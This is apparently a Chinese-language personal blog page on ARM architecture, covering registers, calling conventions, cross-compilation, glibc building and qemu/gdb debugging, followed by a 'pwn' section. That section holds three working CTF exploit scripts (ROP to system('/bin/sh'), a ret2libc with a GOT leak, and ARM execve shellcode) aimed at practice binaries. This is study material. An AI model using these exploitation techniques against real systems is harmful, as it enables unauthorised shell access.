@@ -1,0 +1,327 @@
+
+<!DOCTYPE html>
+<html lang="en | zh-CN |zh-TW">
+<head>
+    <meta charset="utf-8" />
+    <title>arm | Q^Q</title>
+    <meta name="author" content="desk9t" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>Q^Q</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;Q^Q</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>arm</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/6/19
+        </span>
+        
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h4 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h4><h5 id="32位5"><a href="#32位5" class="headerlink" title="32位5"></a>32位5</h5><h6 id="有哪些寄存器"><a href="#有哪些寄存器" class="headerlink" title="有哪些寄存器"></a>有哪些寄存器</h6><p><img src="/./../pictures/arm/MBXY-CR-9bfc0d6b526ccdf1026cd7e0cc76e746.png" alt="img"></p>
+<p>r0 - r3用于函数调用传参，32位最多支持4个入参，当多余4个参数时将通过压栈方式进行传递，栈的方式为先进后出，当参数大于4个时，入栈顺序与参数顺序正好相反，子程序返回前无需恢复 r0 - r3的，32位的返回结果保存在 r0 中；</p>
+<p>r4 - r11 ：用于保存局部变量，函数进入后首先就是将 r4 - 411 入栈保存，然后才能用于本函数使用，本函数使用完之后，要讲之前栈保存的数据恢复到 r4 - r11 中；</p>
+<p>r7 ：系统调用时，存放系统调用号，有时用于作为 FP 使用，FP又叫 frame pinter 即栈基指针，主要在函数中保存当前函数的栈起始位置，用于堆栈回溯；</p>
+<p>r9静态基址寄存器</p>
+<p>r10堆栈限制寄存器</p>
+<p>r11帧指针</p>
+<p>r12指向当前执行指令地址，也称ip寄存器</p>
+<p>r13 ：SP，即栈指针寄存器，主要用于指向当前程序栈顶、配合指令 pop&#x2F;push</p>
+<p>r14 ：LR，即链接寄存器，主要用于存放函数的返回地址</p>
+<p>r15 ：PC，即程序寄存器，主要用于存放CPU取值的地址，是取值地址，不是当前运行地址。<code>pc</code> 寄存器实际上包含了当前指令的地址加上8字节的偏移，32位是两条指令，64位是一条。</p>
+<h5 id="arm传参"><a href="#arm传参" class="headerlink" title="arm传参"></a>arm传参</h5><p>r0-r3是寄存器传参，其余的使用栈传参。</p>
+<p>r4-r8用于保存局部变量，多的也在栈上。</p>
+<p>APSR&#x2F;CPSR：应用程序状态寄存器&#x2F;当前程序状态寄存器。</p>
+<h5 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h5><p>X0-X7 ：传递子程序的参数和返回值，使用时不需要保存，多余的参数用堆栈传递，64位的返回结果保存在 X0 中；</p>
+<p>X8 ：用于保存子程序的返回地址，使用时不需要保存；</p>
+<p>X9-X15 : 临时寄存器，也可叫可变寄存器，子程序使用时不需要保存</p>
+<p>X16 - X17 : 子程序内部调用寄存器(IPx)，使用时不需要保存，尽量不使用。</p>
+<p>X18 : 平台寄存器，其使用与平台相关，尽量不要使用</p>
+<p>X19 - X28 ：临时寄存器，子程序使用时必须保存</p>
+<p>X29 ：帧指针寄存器(FP)，用于连接栈帧，使用时必须保存</p>
+<p>X30 ：链接寄存器(LR)，用于保存子程序的返回地址</p>
+<p>X31：堆栈指针寄存器（SP），用于指向每个函数的栈顶</p>
+<h4 id="工作模式"><a href="#工作模式" class="headerlink" title="工作模式"></a>工作模式</h4><h4 id="交叉编译"><a href="#交叉编译" class="headerlink" title="交叉编译"></a>交叉编译</h4><p>在x86下安装arm环境</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libc6-armhf-cross</span><br></pre></td></tr></table></figure>
+
+<p>相关库在<code>/usr/arm-linux-gnueabihf</code></p>
+<p>软件包</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gcc-arm-linux-gnueabi</span><br><span class="line">sudo apt-get install gcc-aarch64-linux-gnu</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[10:15:00][blact@u22 ~/arm/test]$ arm</span><br><span class="line">arm2hpdl                         arm-linux-gnueabi-elfedit        arm-linux-gnueabi-gcc-ranlib-11  arm-linux-gnueabi-ld             arm-linux-gnueabi-readelf</span><br><span class="line">arm-linux-gnueabi-addr2line      arm-linux-gnueabi-gcc            arm-linux-gnueabi-gcov           arm-linux-gnueabi-ld.bfd         arm-linux-gnueabi-size</span><br><span class="line">arm-linux-gnueabi-ar             arm-linux-gnueabi-gcc-11         arm-linux-gnueabi-gcov-11        arm-linux-gnueabi-ld.gold        arm-linux-gnueabi-strings</span><br><span class="line">arm-linux-gnueabi-as             arm-linux-gnueabi-gcc-ar         arm-linux-gnueabi-gcov-dump      arm-linux-gnueabi-lto-dump-11    arm-linux-gnueabi-strip</span><br><span class="line">arm-linux-gnueabi-c++filt        arm-linux-gnueabi-gcc-ar-11      arm-linux-gnueabi-gcov-dump-11   arm-linux-gnueabi-nm</span><br><span class="line">arm-linux-gnueabi-cpp            arm-linux-gnueabi-gcc-nm         arm-linux-gnueabi-gcov-tool      arm-linux-gnueabi-objcopy</span><br><span class="line">arm-linux-gnueabi-cpp-11         arm-linux-gnueabi-gcc-nm-11      arm-linux-gnueabi-gcov-tool-11   arm-linux-gnueabi-objdump</span><br><span class="line">arm-linux-gnueabi-dwp            arm-linux-gnueabi-gcc-ranlib     arm-linux-gnueabi-gprof          arm-linux-gnueabi-ranlib</span><br></pre></td></tr></table></figure>
+
+
+
+<p>编译</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#test.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;hello,world!&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arm-linux-gnueabi-gcc test.c </span><br></pre></td></tr></table></figure>
+
+<p>执行</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -L /usr/arm-linux-gnueabi ./a.out </span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>因为自带的arm libc没有符号表，所以调试起来将会非常麻烦</p>
+<p>解决方法：</p>
+<ul>
+<li><p>去官方下载.debug文件，在调试时使用add-symble-file</p>
+</li>
+<li><p>重新交叉一个libc</p>
+<p>下好libc文件(以glibc-2.31为例)</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> glibc-2.31</span><br><span class="line"><span class="built_in">mkdir</span> build</span><br><span class="line"><span class="built_in">mkdir</span> armhf</span><br></pre></td></tr></table></figure>
+
+<p>在build文件夹中使用一下命令进行配置(路径补充完整)</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CC=/opt/gcc-linaro-7.5.0-2019.12-x86_64_arm-linux-gnueabihf/bin/arm-linux-gnueabihf-gcc \</span><br><span class="line">CXX=/opt/gcc-linaro-7.5.0-2019.12-x86_64_arm-linux-gnueabihf/bin/arm-linux-gnueabihf-g++ \</span><br><span class="line">CFLAGS=<span class="string">&quot;-g -g3 -ggdb -gdwarf-4 -Og -Wno-error&quot;</span> \</span><br><span class="line">CXXFLAGS=<span class="string">&quot;-g -g3 -ggdb -gdwarf-4 -Og -Wno-error&quot;</span> \</span><br><span class="line">../configure \</span><br><span class="line">--prefix=/home/blact/libc/glibc-2.31/armhf \</span><br><span class="line">--host=arm-linux \</span><br><span class="line">--target=arm-linux \</span><br><span class="line">--disable-werror \</span><br><span class="line">--enable-debug=<span class="built_in">yes</span></span><br></pre></td></tr></table></figure>
+
+<p>然后</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make -j$(<span class="built_in">nproc</span>)</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
+
+<p>编译出来lib文件就在armhf文件下(是armhf的库)</p>
+</li>
+</ul>
+<h5 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h5><p>即使是将带符号的libc编译出来，但在gdb-mutiarch中仍然是是没有符号的，有说需要将lib复制到二进制文件所在位置的，但试过也不行(不知道是不是方法没正确)，软连接也试过，暂时也不行。</p>
+<p>感觉就只有手动载入符号表了。</p>
+<p><code>add-symble-file libcbase</code>或者是<code>set solib-search-path /usr/aarch64-linux-gnu/lib/ </code></p>
+<h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><ul>
+<li><p>下载arm交叉编译链的时候一定注意其架构</p>
+<p><img src="/./../pictures/arm/image-20240226204718074.png" alt="image-20240226204718074"></p>
+</li>
+<li><p>在编译时最好将路径写全，否则可能会apt下载的编译器路径冲突，编译出的东西可能会出问题。</p>
+</li>
+</ul>
+<h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>静态编译的二进制文件不讨论了。</p>
+<p>重点说说动态链接的。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-mutiarch -L /path/to/libc -g the-port the-file-name  <span class="comment">#这里称为程序端，gdb则称为调试端</span></span><br></pre></td></tr></table></figure>
+
+<p>命令执行后，程序挂起</p>
+<p>另一个panel中</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-mutiarch the-file-name  <span class="comment">#注意调试时需要加二进制文件的，因为是远程调试，要加符号表，也可以启动后再加</span></span><br><span class="line"><span class="built_in">set</span> architecture arm <span class="comment">#感觉可以不用加，也可以自动识别</span></span><br><span class="line">target remote :the-port <span class="comment">#开启监听，gdb中开始有内容，这时可以开始一系列断点等操作</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h5><p>需要交互的程序可能有点麻烦。</p>
+<p>我调试时，每当需要交互时，gdb会卡住(用得还不熟吧，大概)，需要在程序端输入数据后额外输入Crl+c中断，才能继续在调试端进行操作。总感觉这个方法还不够优雅。</p>
+<h4 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h4><p>指定位置运行</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -L /usr/arm-linux-gnueabihf/ ./xxx</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="typo"><a href="#typo" class="headerlink" title="typo"></a>typo</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#  context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  for i in range(100, 150)[::-1]:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">112</span>, <span class="number">123</span>):</span><br><span class="line">    <span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">        io = process(<span class="string">&quot;./typo&quot;</span>, timeout = <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;d&quot;</span>:</span><br><span class="line">        io = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;./typo&quot;</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;pwn2.jarvisoj.com&quot;</span>, <span class="number">9888</span>, timeout = <span class="number">2</span>)</span><br><span class="line">    </span><br><span class="line">    io.sendafter(<span class="string">&quot;quit\n&quot;</span>, <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    io.recvline()</span><br><span class="line">    </span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    jarvisOJ_typo [master●●] ROPgadget --binary ./typo --string /bin/sh</span></span><br><span class="line"><span class="string">    Strings information</span></span><br><span class="line"><span class="string">    ============================================================</span></span><br><span class="line"><span class="string">    0x0006c384 : /bin/sh</span></span><br><span class="line"><span class="string">    jarvisOJ_typo [master●●] ROPgadget --binary ./typo --only &quot;pop|ret&quot; | grep r0</span></span><br><span class="line"><span class="string">    0x00020904 : pop &#123;r0, r4, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * i + p32(<span class="number">0x20904</span>) + p32(<span class="number">0x6c384</span>) * <span class="number">2</span> + p32(<span class="number">0x110B4</span>)</span><br><span class="line">    success(i)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#  pause()</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#  pdb.set_trace()</span></span><br><span class="line">        io.sendline(<span class="string">&quot;echo aaaa&quot;</span>)</span><br><span class="line">        io.recvuntil(<span class="string">&quot;aaaa&quot;</span>, timeout = <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h5 id="Melong"><a href="#Melong" class="headerlink" title="Melong"></a>Melong</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python # -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.binary = <span class="string">&quot;./melong&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;r&quot;</span>:</span><br><span class="line">    IO = remote(<span class="string">&quot;&quot;</span>,)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">    IO = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabi/&quot;</span>, <span class="string">&quot;./melong&quot;</span>])</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;d&quot;</span>:</span><br><span class="line">    IO = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1237&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;./&quot;</span>, <span class="string">&quot;./melong&quot;</span>])</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./melong&quot;</span>, checksec = <span class="literal">False</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/usr/arm-linux-gnueabi/lib/libc.so.6&quot;</span>, checksec = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">height, weight</span>):</span><br><span class="line">    IO.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    IO.sendlineafter(<span class="string">&quot; : &quot;</span>, <span class="built_in">str</span>(height))</span><br><span class="line">    IO.sendlineafter(<span class="string">&quot; : &quot;</span>, <span class="built_in">str</span>(weight))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PT</span>(<span class="params">size</span>):</span><br><span class="line">    IO.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    IO.sendlineafter(<span class="string">&quot;?\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">payload</span>):</span><br><span class="line">    IO.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    IO.send(payload)</span><br><span class="line"></span><br><span class="line">pop_r0_pc = <span class="number">0x00011bbc</span></span><br><span class="line"></span><br><span class="line">check(<span class="number">1.76</span>,<span class="number">103</span>)</span><br><span class="line">PT(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">pd = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x54</span> + p32(pop_r0_pc) + p32(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p32(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">pd += p32(<span class="number">0</span>)*<span class="number">7</span> + p32(elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">write(pd)</span><br><span class="line"></span><br><span class="line">IO.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;6&quot;</span>)</span><br><span class="line">IO.recvuntil(<span class="string">&quot;See you again :)\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc.address = u32(IO.recvn(<span class="number">4</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">check(<span class="number">1.82</span>, <span class="number">60</span>)</span><br><span class="line">PT(-<span class="number">1</span>)</span><br><span class="line">pd = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x54</span> + p32(pop_r0_pc) + p32(<span class="built_in">next</span>(libc.search(<span class="string">&quot;/bin/sh&quot;</span>))) + p32(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">write(pd)</span><br><span class="line">IO.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;6&quot;</span>)</span><br><span class="line"></span><br><span class="line">IO.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="root-me-stack-buffer-overflow-basic"><a href="#root-me-stack-buffer-overflow-basic" class="headerlink" title="root_me_stack_buffer_overflow_basic"></a>root_me_stack_buffer_overflow_basic</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;arm&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">IO = process(<span class="string">&quot;qemu-arm -L /usr/arm-linux-gnueabihf ./root_me_stack_buffer_overflow_basic&quot;</span>, shell = <span class="literal">True</span>)</span><br><span class="line"><span class="comment">#IO = remote(&quot;node4.buuoj.cn&quot;, 26999)</span></span><br><span class="line"> </span><br><span class="line">IO.sendlineafter(<span class="string">b&quot;Give me data to dump:\n&quot;</span>, <span class="string">b&#x27;leak&#x27;</span>)</span><br><span class="line">shellcode_addr = <span class="built_in">int</span>(IO.recv(<span class="number">10</span>), <span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;shellcode_addr:\t&quot;</span> + <span class="built_in">hex</span>(shellcode_addr))</span><br><span class="line"> </span><br><span class="line">IO.sendlineafter(<span class="string">b&quot;Dump again (y/n):\n&quot;</span>, <span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    eor r1, r1</span></span><br><span class="line"><span class="string">    eor r2, r2</span></span><br><span class="line"><span class="string">    mov r7, #11</span></span><br><span class="line"><span class="string">    mov r0, pc</span></span><br><span class="line"><span class="string">    svc 0</span></span><br><span class="line"><span class="string">    .ascii &quot;/bin/sh\\0&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">payload = shellcode.ljust(<span class="number">0xa4</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p32(shellcode_addr)</span><br><span class="line">IO.sendlineafter(<span class="string">b&quot;Give me data to dump:\n&quot;</span>, payload)</span><br><span class="line"> </span><br><span class="line">IO.sendlineafter(<span class="string">b&quot;Dump again (y/n):\n&quot;</span>, <span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line">IO.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272332.htm">https://bbs.kanxue.com/thread-272332.htm</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hencins/p/14084435.html">https://www.cnblogs.com/hencins/p/14084435.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cjovi.icu/pwnreview/1353.html">https://www.cjovi.icu/pwnreview/1353.html</a></p>
